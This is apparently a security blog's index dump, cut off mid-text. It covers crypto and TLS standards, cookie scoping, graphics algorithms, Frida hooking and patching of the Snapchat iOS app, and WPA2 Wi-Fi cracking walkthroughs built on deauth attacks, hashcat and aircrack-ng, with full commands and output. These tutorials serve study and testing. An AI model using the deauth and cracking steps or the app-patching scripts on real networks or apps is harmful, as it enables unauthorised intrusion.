Blowfish, Skipjack, DES, 3DES/TDEA shall ONLY be used for legacy decryption. These algorithms are disallowed for encryption purposes. No new applications shall utilise these algorithms. Note: Three-key TDEA for encryption is deprecated through 2023, and will be disallowed after 2023.AES (Advanced Encryption Standard) is recommended for all block cipher encryption needs. The use of AES-128, AES-192, &amp; AES-256 is acceptable for encryption and decryption. AES is a FIPS-approved symmetric-key algorithm that may be used by to protect sensitive information.NIST - Transitioning the Use of Cryptographic Algorithms and Key LengthsOWASP - Testing for Weak EncryptionMicrosoft Cryptography - Microsoft SDL Cryptographic RecommendationsCipher ModesECB, CBC, OFB, CFB, CTR shall NOT be used as they provided confidentiality only, but not authenticated encryption. ECB shall NOT be used under any circumstance.CCM, GCM shall be used as they provide both confidentiality and authentication. Other FIPS certified block cipher modes do exist. However, they have limited and often very specific use cases.IVs (Initialization Vectors) and Salts used must be unique and cryptographically strong random numbers. IVs should never be reused, especially in CTR and GCM cipher modes.NIST - Block Cipher TechniquesNIST - Recommendation for Block Cipher Modes of Operation: the CCM Mode for Authentication and ConfidentialityNIST - Recommendation for Block Cipher Modes of Operation: Galois/Counter Mode (GCM) and GMACKey DerivationPBKDF1 (Password-Based Key Derivation Function 1) shall NOT be used as it has a maximum key length of 160 bits.PBKDF2 (Password-Based Key Derivation Function 2) should be used when a user supplied key is required as input. The provided salt shall be at least 32 bits long and cryptographically random. The iteration count should be as high as possible whilst not negatively impacting server performance. An iteration count of a minimum of 10,000 shall be used.NIST - Special Publication: Authentication and Lifecycle ManagementIETF - PKCS #5: Password-Based Cryptography Specification Version 2.0Asymmetric EncryptionDigital SignaturesDSA with private key that provide less than 112 bits of security shall NOT be used for digital signature generation.DSA with private key that provide at least 112 bits of security shall be used for digital signature generation. DSA domain parameters should be (2048, 224) or (2048, 256) shall be used for 112 bits of security, or (3072, 256) shall be used which provides 128 bits of security.RSA with len(n) &lt; 2048 bits shall NOT be used for digital signature generationRSA with len(n) &gt;= 2048 bits shall be used for digital signature generation. Any modulus with an even bit length that provides at least 112 bitsof security strength may be used. RSA Modulus length (n) in bits Bit of Security 2048 112 3072 128 4096 152 6144 176 8192 200 ECDSA: with len(n) &lt; 224 bits shall NOT be used for digital signature generation.ECDSA: with len(n) &gt;= 224 bits shall be used for digital signature generation.NIST - Recommendation for Pair-Wise Key-Establishment Using Integer Factorization CryptographyNIST - Transitioning the Use of Cryptographic Algorithms and Key LengthsMessage Authentication Codes (MACs)Key lengths &lt; 112 bits shall NOT be used for HMAC Generation as they are disallowed.Key lengths &gt;= 112 bits shall be used for HMAC Generation.NIST - Transitioning the Use of Cryptographic Algorithms and Key LengthsTLS ConfigurationTools for Checking TLS/SSL Configuration sslscan - Windows sslscan - Linux (Kali) testssl - Linux sslyze - Python (Windows/Linux)SSL/TLS VersionsSSLv2 &amp; SSLv3 shall be DISABLED and not be used. This may potentially cause compatibility issues if Windows XP SP2 and older systems require support.TLSv1.0 &amp; TLSv1.1 shall be DISABLED unless there is a strong requirement for backwards compatibility.TLSv1.2 &amp; TLSv1.3 shall be the only two version used. TLSv1.3 shall be supported by all government and citizen applications by January 1st 2024. TLSv1.2 should be disabled if it is not needed for interoperability.Mozilla Wiki - Security/Server Side TLSMicrosoft Cryptography - Microsoft SDL Cryptographic RecommendationsIETF - Recommendations for Secure Use of Transport Layer Security (TLS) and Datagram Transport Layer Security (DTLS)Cipher SuitesNull cipher shall be DISABLED and never used.MD5, SHA1, RC4, DES, 3DES/TDEA cipher suites shall be DISABLED as they are no longer considered secure.NIST - Guidelines for the Selection, Configuration, and Use of Transport Layer Security (TLS) ImplementationsMozilla Wiki - Security/Server Side TLSOWASP - Testing for Weak Transport Layer SecurityConfiguration OptionsTLS SCSV (Fallback Signaling Cipher Suite Value) shall be supported for TLSv1.0, v1.1, &amp; v1.2. This is not required for TLSv1.3 as it includes a mechanism to protect against this downgrade attack.TLS Compression shall NOT be utilised and all methods shall be disabled.TLS SNI (Server Name Indication) shall be supported by all versions of TLS. The server shall be able to support multiple virtual servers that may exist at the same network address.HSTS (HTTPS Strict Transport Security) shall be configured with max-age=63072000 (two years).Certificate Lifespan shall be 90 days, and shall NOT more than 366 days.Mozilla Wiki - Security/Server Side TLSNIST - Guidelines for the Selection, Configuration, and Use of Transport Layer Security (TLS) Implementations" }, { "title": "Sequential Payload Generator", "url": "/posts/sequential-payload-generation/", "categories": "tools", "tags": "tools, security, fuzzing", "date": "2022-05-22 21:02:53 +1000", "snippet": "This tool generates a list of sequential payloads starting and ending at the specified numbers. These values can be arbitrarily large and outputted as integers, HEX values, or base64 encoded string...", "content": "This tool generates a list of sequential payloads starting and ending at the specified numbers. These values can be arbitrarily large and outputted as integers, HEX values, or base64 encoded strings.The maximum amount of payloads that can be generated has been limited to 2 million to prevent crashing and/or freezing the browser and to prevent copying &amp; pasting taking too long.This tool uses BigInts for handling integers in JavaScript, so arbitrarily large values can be entered &amp; generated.\t\t\tStart Position\t\t\t\t\t\tEnd Position\t\t\tOutput ModeIntegerHEXBase64 - Integer as String (E.g. “1000” -&gt; “MTAwMA==”)Base64 - Raw Integer (E.g. 1000 -&gt; 0x03e8 -&gt; “A+g=”)Copy Payloads to ClipboardGenerated Payloads" }, { "title": "XOR Encryption Cracker", "url": "/posts/xor-encryption-cracker/", "categories": "tools", "tags": "tools, security, cryptography, algorithm, cipher", "date": "2022-04-24 19:23:01 +1000", "snippet": "This is a tool for breaking the encryption of messages that have been XOR encrypted using a repeated key. This method uses statistics (letter frequencies and use of common words, bigrams, and trigr...", "content": "This is a tool for breaking the encryption of messages that have been XOR encrypted using a repeated key. This method uses statistics (letter frequencies and use of common words, bigrams, and trigrams), so the cipher-text needs to be a decent size otherwise it won’t work. For an in-depth explanation of how this works, please read my post here.Input ModeHEXBase64UTF-8InputMinimum Key Length (in Bytes)Maximum Key Length (in Bytes)Decryption OptionsAttempt only the 5 most likely key lengthAttempt all key lengths (this will take longer)Attempt DecryptionDecryption Result(See console for progress &amp; additional results)" }, { "title": "Cracking WPA2-PSK with Hashcat", "url": "/posts/cracking-wpa2-with-hashcat/", "categories": "security, wireless", "tags": "security, wireless, wpa2", "date": "2022-02-26 12:59:32 +1000", "snippet": "This post will cover how to crack Wi-Fi passwords (with Hashcat) from captured handshakes using a tool like airmon-ng. Install hcxtools Extract Hashes Crack with HashcatInstall hcxtoolsTo start ...", "content": "This post will cover how to crack Wi-Fi passwords (with Hashcat) from captured handshakes using a tool like airmon-ng. Install hcxtools Extract Hashes Crack with HashcatInstall hcxtoolsTo start off we need a tool called hcxtools. If not already installed on your kali machine, you can install it using:apt install hcxtoolsExtract HashesNext we need to extract the required data and convert it to a format Hashcat can understandhcxpcapngtool wifiCapture-01.cap -o /home/user1/wifiHashes.txt -o to specify the output file the for extracted data.hcxpcapngtool 6.2.5 reading from wifiCapture-01.cap...summary capture file--------------------file name................................: wifiCapture-01.capversion (pcap/cap).......................: 2.4 (very basic format without any additional information)timestamp minimum (GMT)..................: 05.02.2022 23:48:32...EAPOL M32E2 (authorized).................: 1PMKID (total)............................: 2PMKID (best).............................: 1PMKID written to combi hash file.........: 1session summary---------------processed cap files...................: 1The output in the wifiHashes.txt file can now be fed into Hashcat:WPA*01*b0f5e0b8617ab00c85f135ebaca7a865*112233445566*224466883355*5465737457696669***WPA*02*96faaa6f7fe58a537433d88754cd8e65*112233445566*224466883355*5465737457696669*60...b0*0103....00*a2 Line 2 has been shortenedCrack with HashcatWith the above out fille we can now use Hashcat (mode 2200) to crack the password much faster:PS U:\\Hashcat&gt; .\\hashcat.exe -m 22000 -w 3 .\\toCrack\\wifiHashes.txt .\\passwordLists\\hashkiller-dict.txtSession..........: hashcatStatus...........: RunningHash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)Hash.Target......: .\\toCrack\\wifiHashes.txtTime.Started.....: Sat Feb 05 23:58:37 2022 (3 mins, 26 secs)Time.Estimated...: Sun Feb 06 00:09:37 2022 (7 mins, 34 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (.\\passwordLists\\hashkiller-dict.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 367.7 kH/s (78.55ms) @ Accel:64 Loops:512 Thr:128 Vec:1Recovered........: 2/4 (50.00%) DigestsProgress.........: 87767490/254902169 (34.43%)Rejected.........: 12007874/87767490 (13.68%)Restore.Point....: 87724815/254902169 (34.42%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1536-2048Candidate.Engine.: Device GeneratorCandidates.#1....: leo31639 -&gt; solyhe03Hardware.Mon.#1..: Temp: 64c Fan: 32% Util: 87% Core:1888MHz Mem:6794MHz Bus:16b0f5e0b8617ab00c85f135ebaca7a865:112233445566:224466883355:TestWifi:Password$12396faaa6f7fe58a537433d88754cd8e65:112233445566:224466883355:TestWifi:Password$123The attack was successful and we found out the Wi-Fi password was Password$123." }, { "title": "Getting Started with airmon-ng", "url": "/posts/getting-started-with-airmon-ng/", "categories": "security, wireless", "tags": "security, wireless, wpa2", "date": "2022-02-15 15:47:19 +1000", "snippet": "This post will show how to get started using aircrack-ng to discover wi-fi networks, capture handshakes, deauth clients, and crack passwords. Setup airmon-ng Install aircrack-ng Suite ...", "content": "This post will show how to get started using aircrack-ng to discover wi-fi networks, capture handshakes, deauth clients, and crack passwords. Setup airmon-ng Install aircrack-ng Suite Monitor Mode Capturing Packets Basic Capture Advanced Capturing Deauthing Users Crack PasswordsSetup airmon-ngInstall aircrack-ng SuiteIf you’re using Kali this should come pre-installed, but if not, you can install all the required tools using:sudo apt install aircrack-ngMonitor ModeThe first step will be to enable monitor mode on our wi-fi card. Assuming our wireless network adaptor is wlan0, we put our card into monitor mode using:airmon-ng start wlan0You should now have a new wireless network adaptor that has the same name with mon appended to the end. So our adaptor will be called wlan0mon.Additionally, you made need to kill some processes that can cause issues. This can be done using:airmon-ng check killCapturing PacketsBasic CaptureWe can begin a basic capture and log the results. This will allow us to cycle through the wifi channels and discover Access Points and Clients.airodump-ng -w wifiScan1 wlan0mon -w specifies the output files. This ONLY listens on 2.4Ghz range.From the above command you’ll see two separate tables. For the first table: Column Meaning BSSID MAC address of the AP ESSID Name of the Wi-Fi Network Beacons Number of Beacon Frames received from the AP CH The current channel of the AP ENC, CIPHER &amp; AUTH Encryption &amp; Authentication details For the second table: Column Meaning BSSID MAC address of the AP the client is communicating with Station MAC address of the client Frames Data Frames received from the client Probes Wi-Fi network the client is communicating with Advanced CapturingAfter seeing what networks are around, we can target specific channels and ESSIDs. Let’s say our target wi-fi network is TestWifi, and is using channel 4.airodump-ng -a -c 4 --essid \"TestWifi\" -w wifiScan2 wlan0mon -a only show associated clients -c 4 only capture on channel 4 --essid \"TestWifi\" only show APs with the ESSID of “TestWifi”Sample output: CH 4 ][ Elapsed: 1 min ][ 2022-02-05 12:06 BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 11:22:33:44:55:66 -28 100 594 799 0 4 130 WPA2 CCMP PSK TestWifi BSSID STATION PWR Rate Lost Frames Notes Probes 11:22:33:44:55:66 22:44:66:88:33:55 -41 12e-24 34 977 TestWifiBecause we are saving the output, there will be a capture file .cap included as part of this. However, unless a client connects while we are listening, we won’t have any handshakes recorded.If there are already clients connected, we can attempt to forcible disconnect them and listen for the handshake when they re-connect.Deauthing UsersWhile the previous command is running and we’re capturing handshakes , we can open another terminal and de-auth an AP, or a specific client connected to an AP.Target an AP:aireplay-ng -0 10 -a 11:22:33:44:55:66 wlan0mon -0 10 deauth mode and perform the deauth attack 10 times. -a MAC address of the AP.Target a Client connected to an AP:aireplay-ng -0 10 -a 11:22:33:44:55:66 -c 22:44:66:88:33:55 wlan0mon -c MAC address of the clientAfter performing this attack, the capture should be left running for at least a few minutes to allow the clients to re-connect.Crack PasswordsAssuming our attack was successful, we can analyse the output .cap file for handshakes and attempt to crack them offline. Let’s analyse the output file wifiScan2-01.cap from our previous capture and attempt to crack the password using the rockyou word list:aircrack-ng wifiScan2-01.cap -w rockyou.txtReading packets, please wait...Opening wifiScan2-01.capRead 6966 packets. # BSSID ESSID Encryption 1 11:22:33:44:55:66 TestWifi WPA (1 handshake, with PMKID)Choosing first network as target.Reading packets, please wait...Opening wifiScan2-01.capRead 6966 packets.1 potential targets Normally you would be ask which target you want to crack, however, since there is only 1 it will automatically selected.The cracking will now start: Aircrack-ng 1.6 [00:00:04] 78245/14344391 keys tested (20290.49 k/s) Time left: 11 minutes, 43 seconds 0.55% Current passphrase: sukiyaki Master Key : 23 17 DE 4E 8C FC 74 67 82 3F 04 E9 0A 22 CE 25 FD 01 FA DB 29 D2 3A 2C 79 F0 7D 05 36 DA 48 1B Transient Key : E9 B7 AD 37 73 E5 A5 15 24 30 7A F0 64 AF 3B 14 EB 68 02 69 EE D2 C4 DF 80 C6 9F E6 11 00 E2 A8 FF 8A 66 56 85 AE FE B3 31 06 16 AC 6B 1A E1 DA AB 21 AA 22 C9 9E 42 3E 3D ED 28 C1 F7 F1 AE E3 EAPOL HMAC : B8 16 E5 77 E5 AB BD B6 1A 3A 69 A3 19 1C 21 C4The above attack is running at around 20 thousand keys per second. This is running on a Intel Core i7 8700. We can improve the performance a lot by using Hashcat instead of aircrack-ng to crack the password. You can read how to do that here." }, { "title": "Cookies, Ports and Subdomains", "url": "/posts/cookies-ports-and-subdomains/", "categories": "security, web", "tags": "web, security, http, https, cookies", "date": "2022-01-28 22:08:10 +1000", "snippet": "This post will look at how browser cookies work when used on different subdomains and on different ports. Short Answer &amp; Summary Cookie without Domain Attribute Same Domain Different...", "content": "This post will look at how browser cookies work when used on different subdomains and on different ports. Short Answer &amp; Summary Cookie without Domain Attribute Same Domain Different Port Subdomain with Same Port Cookie with Domain Attribute Subdomain with Same Port Again Subdomain with Different Port I would suggest clicking on the images below to enlarge them, as the browser text can be quite small in places.Also, for all the below examples, my-testing.com resolves to 127.0.0.1 via a host file entry, and has nothing todo with the real domain.Short Answer &amp; SummaryBelow is two tables summarising the results from the post for those that want a TLDR or quick refresher. If these tables don’t make sense, then please continue reading.If the cookie DOES NOT have the Domain attribute set: Action Example Cookie is Sent Parent Domain my-testing.com:8443 ✅ Parent Domain &amp; Different Port my-testing.com:9999 ✅ Subdomain subdomain1.my-testing.com:8443 ❌ Subdomain &amp; Different Port subdomain1.my-testing.com:9999 ❌ If the cookie DOES have the Domain attribute set: Action Example Cookie is Sent Parent Domain my-testing.com:8443 ✅ Parent Domain &amp; Different Port my-testing.com:9999 ✅ Subdomain subdomain1.my-testing.com:8443 ✅ Subdomain &amp; Different Port subdomain1.my-testing.com:9999 ✅ The conclusion is that if your web application is hosted on a domain that has no other web applications on any subdomains, then it would be best to not included the Domain attribute.If different applications are hosted on subdomains, then consideration should be given as to whether the parent domain should be able to share cookies with them or not.Cookie without Domain AttributeWe’ll start off by setting a cookie called sessionid when we visit https://my-testing.com:8443/home.Here is what the Set-Cookie header looks like on the response:Set-Cookie: sessionid=AMoxoICZ9sWXTi98j6iGn2Wefet3T52qEhB6XCUJssHzl19P; Max-Age=3600; Path=/; Expires=Fri, 28 Jan 2022 11:38:40 GMT; HttpOnly; Secure; SameSite=Strict Notice that there is no Domain attribute in the above header. This is IMPORTANT.Same Domain Different PortLet’s see what happens if we visit a link on the same domain, but a different port. This represents another web server running on a different port. We’ll try and load https://my-testing.com:9999/ and see what happens.The webserver has returned a 404 response. But, if we look more closely, we can see that our sessionid cookie was still sent in the request.Checking the server logs we can see that the cookie was received as well.Okay so we know that ports don’t matter if we are loading the page directly. But what about subdomains?Subdomain with Same PortWe’ll now try and load the page https://subdomain1.my-testing.com:8443/.From the request headers we can see that our sessionid cookie was NOT sent with the request this time.Checking the server logs we can see that the cookie was NOT received either.Okay cool, so cookies set on the parent domain are not valid for subdomains right? Well, if the Domain attribute isn’t set on a cookie, then yes this is correct. But, this changes if we DO use the Domain attribute.Cookie with Domain AttributeLet’s perform the experiment again now with the Domain attribute set.Here is what the Set-Cookie header looks like on the response:Set-Cookie: sessionid=gzwFezc9KQ1LHlfVObcb583v1Iyt4XKM0riVM3oUoW8THdpi; Max-Age=3600; Domain=my-testing.com; Path=/; Expires=Fri, 28 Jan 2022 11:45:06 GMT; HttpOnly; Secure; SameSite=Strict Notice the Domain=my-testing.com piece in the above header. This is IMPORTANT.Subdomain with Same Port AgainNow if we try and load page https://subdomain1.my-testing.com:8443/, we get a different result.We can see that cookie was sent in the request this time.Checking the server logs also shows the cookie was received by the web server.Subdomain with Different PortAs a final test we’ll see if the cookie with the Domain attribute is sent when we use a subdomain and different port.I.e. https://subdomain1.my-testing.com:9999/The cookie was again included in the request, showing that the port has no effect on whether the cookie is sent.For a summary of these findings, please refer to the table in the Short Answer &amp; Summary section at the top of this page.References MDN - Set-Cookie" }, { "title": "Interesting Algorithms", "url": "/posts/intertesting-algorithms/", "categories": "programming", "tags": "programming", "date": "2022-01-20 06:19:04 +1000", "snippet": "In this post we’ll look at some cool algorithms, methods &amp; formulas that solve interesting problems. Fibonacci Sphere Example Code Sphere Projection UV Mapping ...", "content": "In this post we’ll look at some cool algorithms, methods &amp; formulas that solve interesting problems. Fibonacci Sphere Example Code Sphere Projection UV Mapping Polar Coordinates Method 1 Polar Coordinates Method 2 Project UV Map onto Sphere Smooth Minimum Two Functions Min of the Two Functions Smooth Min Function Applied Code Random Number with BiasFibonacci SphereThis algorithm allows us to generate a sphere made of N points that are pretty evenly distributed. I first learned about this algorithm here, which is also where the code comes from.Fibonacci Sphere Example Fibonacci Sphere Codelet radius = 300;let numOfPoints = 1500;let goldenRatio = (1 + Math.sqrt(5)) / 2;let angleIncrement = 2*Math.PI * goldenRatio;for (let i = 0; i &lt; numOfPoints; ++i) {\tlet t = i / numOfPoints;\tlet angle1 = Math.acos(1 - 2*t);\tlet angle2 = angleIncrement * i;\tlet x = Math.sin(angle1) * Math.cos(angle2);\tlet y = Math.sin(angle1) * Math.sin(angle2);\tlet z = Math.cos(angle1);}Sphere ProjectionThis section will look at projecting points from a sphere onto a 2d plane using three different methods. The examples below will use the $X$, $Y$, $Z$ points generated by the Fibonacci Sphere code above.The following sphere was used in the below examples:UV MappingThe variables $U$ and $V$ are used to represent the $X$ and $Y$ values in 2d so that they don’t get confused with the $X$, $Y$, $Z$ values of the 3d coordinate used as input.The inputs values $\\left\\{ X,Y,Z \\in \\left[-1, 1\\right] \\subset \\mathbb{R}\\right\\}$, and the output values $\\left\\{ U,V \\in \\left[0, 1\\right] \\subset \\mathbb{R} \\right\\}$.$U = 0.5 + \\arctan2(X, Z) / 2\\pi$$V = 0.5 - \\arcsin(Y) / \\pi$The formula can be adjusted to the following so that $\\left\\{ U,V \\in \\left[-1, 1\\right] \\subset \\mathbb{R} \\right\\}$:$U = 2\\arctan2(X, Z) / 2\\pi$$V = 2\\arcsin(Y) / \\pi$Polar Coordinates Method 1Instead of projecting the sphere on a square, we can project it onto a circle instead.$r = \\sqrt{X^2 + (Y+1)^2 + Z^2}$$U = r\\cos(\\arctan2(X, Z))$$V = r\\sin(\\arctan2(X, Z))$The above formula is obtained by combing the Spherical1 and Polar2 coordinate system formulas. Here is how it’s done.We can convert from the Polar coordinates to Cartesian coordinates using the following:$U = r\\cos(\\varphi)$$V = r\\sin(\\varphi)$To get $\\varphi$ we use the Spherical coordinate formula. Since we want $\\varphi$ to be $\\left[0,2\\pi\\right]$, we want to use the azimuthal angle, which can be calculated using:$\\varphi = \\arctan2(X, Z)$$X$ and $Z$ are used in the above line because the y-axis is vertical our 3d space.Finally we need to calculate the radius $r$, which can be done by using the Spherical coordinate radius formula. The only adjustment is that we need to calculate the distance from the bottom of the sphere $(0,-1,0)$, otherwise we will end up with all the points mapped onto the perimeter of circle, rather than inside it.$r = \\sqrt{X^2 + (Y+1)^2 + Z^2}$Polar Coordinates Method 2We can do a slight modification to the above formula for calculating the radius, by just using the $Y$ value. Since $\\left\\{ Y \\in \\left[-1, 1\\right] \\subset \\mathbb{R} \\right\\}$, and radii can’t be negative, we need to map $Y$ so $\\left\\{ Y \\in \\left[0, 1\\right] \\subset \\mathbb{R} \\right\\}$. This is what $Y_{m}$ does below:$Y_{m} = (Y+1) / 2$$U = Y_{m}\\cos(\\arctan2(X, Z))$$V = Y_{m}\\sin(\\arctan2(X, Z))$While the above formula is nice, there is an obvious clustering of points at the center of the circle. We can fix this by making the radius equal $\\sqrt{Y_{m}}$ instead of just $Y_{m}$. An explanation of why this works can be here. The range of $U$ and $V$ stay the same, as $Y_{m}$ has the range $\\left[0, 1\\right]$ and $\\sqrt{Y_{m}}$ also has the range $\\left[0, 1\\right]$, since $\\sqrt{0} = 0$ and $\\sqrt{1} = 1$.$Y_{m} = \\sqrt{(y+1) / 2}$$U = Y_{m}\\cos(\\arctan2(X, Z))$$V = Y_{m}\\sin(\\arctan2(X, Z))$Even with this adjustment, the output will still be slightly different from the previous method, as the $X$ and $Z$ values were not taken into account when calculating the radius.Project UV Map onto SphereThis is the reverse transformation to the UV Mapping we did above. For the below equations, the input values $\\left\\{ U,V \\in \\left[0, 1\\right] \\subset \\mathbb{R} \\right\\}$, and the output values $\\left\\{ X,Y,Z \\in \\left[-1, 1\\right] \\subset \\mathbb{R}\\right\\}$.$r = \\cos(\\pi(0.5-V))$$X = r\\sin(2\\pi(U-0.5))$$Y = \\sin(\\pi(0.5-V))$$Z = r\\cos(2\\pi(U-0.5))$Smooth MinimumThe smooth min function as the name implies allows us to take the minimum of two values smoothly, which works to remove sharp edges when blending functions and shapes3.Two FunctionsThe (red) function below is: $y_{0} = x^2$The (blue) function below is: $y_{1} = 30sin(x) + 15$Min of the Two FunctionsThe (yellow) function below is: $y = min(y_{0}, y_{1})$without the original functions:Smooth Min Function AppliedNow using the smooth min function instead of min: $y = SmoothMin(y_{0}, y_{1})$with more smoothing applied (a larger k value):Smooth Min Codefunction SmoothMin(a, b, k) {\tlet h = Math.max(k-Math.abs(a-b), 0.0) / k;\treturn Math.min(a, b) - h*h*k*(1.0 / 4.0);}Random Number with BiasIf a random number between $0$ and $1$ needs to be generated with a bias towards a certain number, the below function can be used4 5. The function takes in a value $\\left\\{X \\in \\left[0,1 \\right] \\subset \\mathbb{R}\\right\\}$, and a value $\\left\\{bias \\in \\left[0,1 \\right) \\subset \\mathbb{R}\\right\\}$.A $bias$ value of $0$ will mean no bias, while a $bias$ value closer to $1$ will mean lower values (closer to zero) are much more likely.If a bias towards higher values (closer to one) is needed, then the output of the function can be subtracted from $1$:$Output = 1 - BiasFunction(x, bias)$function BiasFunction (x, bias) {\tlet k = Math.pow(1-bias, 3);\treturn (k*x) / (k*x - x +1);}The following graph shows the above function with $bias = 0$:Now with a $bias = 0.6$:SourcesPlease see the sources below for more information regarding each topic: Fibonacci Sphere UV Mapping Spherical Coordinate System - https://en.wikipedia.org/wiki/Spherical_coordinate_system &#8617; Polar Coordinate System - https://en.wikipedia.org/wiki/Polar_coordinate_system &#8617; Smooth Minimum Function - https://www.iquilezles.org/www/articles/smin/smin.htm &#8617; Random Number with Bias 1 - https://www.youtube.com/watch?v=lctXaT9pxA0 &#8617; Random Number with Bias 2 - https://www.shadertoy.com/view/Xd2yRd &#8617; " }, { "title": "Frida for iOS", "url": "/posts/frida-for-ios/", "categories": "security, mobile", "tags": "security, mobile, ios, frida, programming, javascript", "date": "2022-01-14 16:52:38 +1000", "snippet": "Introductory guide on how to use Frida to analyse iOS applications at runtime to perform actions such as search for methods, hook methods, view &amp; modify instructions, and view &amp; modify regi...", "content": "Introductory guide on how to use Frida to analyse iOS applications at runtime to perform actions such as search for methods, hook methods, view &amp; modify instructions, and view &amp; modify registers. This guide already assumes you have frida installed and have frida-server installed on your iOS device.For the below code examples, Snapchat was used as the target application. Basic iOS Hooking Running Scripts Get and Search Classes Get Class Methods Get Memory Address of Class Method Hexdump Area of Memory Create Pointer to Memory Address Monitor File Access Methods Hooking a Method View Method Arguments View and Modify Registers Working with Instructions Get Instruction at Memory Address Overwrite Instruction at Memory Address Basic iOS HookingRunning ScriptsGet Running Applications:root@kali:~# frida-ps -UaPID Name Identifier----- -------- -----------------------1285 Camera com.apple.camera14968 Snapchat com.toyopagroup.picabooRun Frida script against target application:root@kali:~# frida -U -f com.toyopagroup.picaboo -l script.js --no-pause -U USB mode -f specify target application -l specify frida script --no-pause don’t pause the application during startupGet and Search Classes// List of Strings to search forlet toSearchFor = [\t'rawframe',\t'jpeg',];let matches = [];// Iterate over all the ObjC classesfor (let className in ObjC.classes){ \tif (!ObjC.classes.hasOwnProperty(className)) continue;\tlet lowerCaseName = className.toLowerCase();\tlet found = false;\t// Check if the name of the Class contains any of the target Strings\tfor (let i = 0; i &lt; toSearchFor.length; ++i) {\t\tif (lowerCaseName.includes(toSearchFor[i])) matches.push(`\"${className}\"`);\t}}matches.sort();console.log();console.log(matches.join('\\n'));console.log(`\\n[+] Finished Search: ${matches.length} result(s) found\\n`);\"BWIntermediateJPEGCompressedBufferAssociatedSemaphore\"\"BWIntermediateJPEGCompressor\"\"FFJpegFrame\"\"FFOptimizedRawFrame\"\"FFRawFrame\"\"MFHardwareJPEGScaler\"\"NUImageExportFormatJPEG\"\"PLJPEGThumbnailDecode\"[+] Finished Search: 8 result(s) foundGet Class Methodslet className = 'FFJpegFrame';// Iterate over all the ObjC classesfor (let className in ObjC.classes){ \tif (ObjC.classes.hasOwnProperty(className)) continue;\tlet lowerCaseName = className.toLowerCase();\tlet found = false;\t// Check if the name of the Class contains any of the target Strings\tfor (let i = 0; i &lt; toSearchFor.length; ++i) {\t\tif (lowerCaseName.includes(toSearchFor[i])) matches.push(`\"${className}\"`);\t}}Get Memory Address of Class Methodlet className = `FFJpegFrame`;let methodName = `- setData:`;let address = ObjC.classes[className][methodName].implementation;console.log(`Address: ${address}`);Address: 0x102a9305cHexdump Area of Memorylet address = ObjC.classes[className][methodToHook].implementation;let hexData = hexdump(address, {\toffset: 0,\tlength: 64,});console.log(hexData); 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF10102b05c e1 03 02 aa 00 20 00 91 d2 4c 78 15 00 20 00 91 ..... ...Lx.. ..10102b06c 01 00 80 d2 cf 4c 78 15 ff 43 01 d1 e9 23 01 6d .....Lx..C...#.m10102b07c f6 57 02 a9 f4 4f 03 a9 fd 7b 04 a9 fd 03 01 91 .W...O...{......10102b08c f5 03 02 aa f4 03 00 aa e0 03 02 aa a4 4c 78 95 .............Lx.Create Pointer to Memory Address// Create a Pointer to a specific Memory Addresslet pointer1 = new NativePointer(0x10010318);let pointer2 = ptr(0x10010318); // This is short-hand for the above statement// Add offset to Addresslet pointer3 = pointer2.add(0x08); // 0x10010320console.log(`pointer1: ${pointer1}`);console.log(`pointer2: ${pointer2}`);console.log(`pointer3: ${pointer3}`);pointer1: 0x10010318pointer2: 0x10010318pointer3: 0x10010320Monitor File AccessInterceptor.attach(ObjC.classes.NSFileManager['- fileExistsAtPath:'].implementation, {\tonEnter: function (args) {\t\tconsole.log('open' , ObjC.Object(args[2]).toString());\t}});MethodsHooking a Methodlet className = `SCDiscoverFeedRanker`;let methodName = `- addListener:`;let address = ObjC.classes[className][methodName].implementation;Interceptor.attach(address, {\tonEnter: function(args) {\t\tconsole.log();\t\tconsole.log(`Function Called`);\t},\tonLeave: function(returnValue) {\t\tconsole.log(`\\nReturn Value: ${returnValue}`);\t}});Function CalledReturn Value: 0x1View Method Argumentslet className = `SCDiscoverFeedRanker`;let methodName = `- addListener:`;let address = ObjC.classes[className][methodName].implementation;Interceptor.attach(address, {\tonEnter: function(args) {\t\tconsole.log('arg[0]:', args[0]);\t\tconsole.log('arg[1]:', args[1]);\t\tconsole.log('arg[2]:', args[2]);\t}});arg[0]: 0x2817ac060arg[1]: 0x1e43ee192arg[2]: 0x119d79700View and Modify Registerslet className = `SCDiscoverFeedRanker`;let methodName = `- addListener:`;let address = ObjC.classes[className][methodName].implementation;Interceptor.attach(address, {\tonEnter: function(args) {\t\t// Print ALL Registers\t\tconsole.log(JSON.stringify(this.context, null, 4), '\\n');\t\t// View Register Value\t\tconsole.log(`Register (x14): ${this.context.x14}`);\t\tconsole.log(`Register (x14): ${this.context.x14.toInt32()}\\n`);\t\t// Update Register Value\t\tthis.context.x14 = 64;\t\tthis.context.x14 = 0x44; // Same as the previous line\t\t// View Register Value\t\tconsole.log(`Register (x14): ${this.context.x14}`);\t\tconsole.log(`Register (x14): ${this.context.x14.toInt32()}`);\t},});{\t\"pc\": \"0x102d91d34\",\t\"sp\": \"0x16d3f42d0\",\t\"x0\": \"0x2831e8a80\",\t\"x1\": \"0x1e43ee192\",\t...\t\"x13\": \"0x0\",\t\"x14\": \"0x18\",\t\"x15\": \"0x1\",\t...\t\"x28\": \"0x2815d3f20\",\t\"fp\": \"0x16d3f4440\",\t\"lr\": \"0x102d90638\"}Register (x14): 0x18Register (x14): 24Register (x14): 0x44Register (x14): 68Working with InstructionsGet Instruction at Memory Addresslet className = `FFJpegFrame`;let methodName = `- setData:`;let address = ObjC.classes[className][methodName].implementation;console.log(`Instruction at ${address}: ${Instruction.parse(address)}`);console.log();console.log('Instruction (mnemonic):', Instruction.parse(address).mnemonic);console.log('Instruction (opStr):', Instruction.parse(address).opStr);Instruction at 0x1053818cc: mov x1, x2Instruction (mnemonic): movInstruction (opStr): x1, x2Overwrite Instruction at Memory Addresslet className = `FFJpegFrame`;let methodName = `- setData:`;let address = ObjC.classes[className][methodName].implementation;let addressToOverwrite = address.add(0x0c);console.log(`Instruction at ${addressToOverwrite} (BEFORE): ${Instruction.parse(addressToOverwrite)}`);Memory.patchCode(addressToOverwrite, 4, code =&gt; { let cs = new Arm64Writer(code, { pc: code }); cs.putNop(); cs.flush();});console.log(`Instruction at ${addressToOverwrite} (AFTER): 